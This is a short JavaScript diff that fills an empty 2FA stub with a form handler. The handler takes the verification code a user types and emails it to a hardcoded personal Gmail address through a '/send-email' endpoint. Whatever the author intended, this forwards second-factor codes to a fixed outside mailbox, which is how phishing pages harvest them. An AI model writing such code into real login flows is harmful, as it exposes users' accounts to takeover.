@@ -14,6 +14,33 @@ function login(){
     });
 }
 
-function TwoFA(){
-   
-}
+document.addEventListener('DOMContentLoaded', () => {
+    const verifyForm = document.getElementById('verify-form');
+
+    verifyForm.addEventListener('submit', async (event) => {
+        event.preventDefault(); // Prevent form submission
+        const code = document.getElementById('2facode').value;
+
+        try {
+            const response = await fetch('/send-email', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    email: 'harvey.a.barnes@gmail.com',
+                    message: `Your 2FA code is: ${code}`,
+                }),
+            });
+
+            if (response.ok) {
+                alert('Email sent successfully!');
+            } else {
+                alert('Failed to send email.');
+            }
+        } catch (error) {
+            console.error('Error:', error);
+            alert('An error occurred.');
+        }
+    });
+});
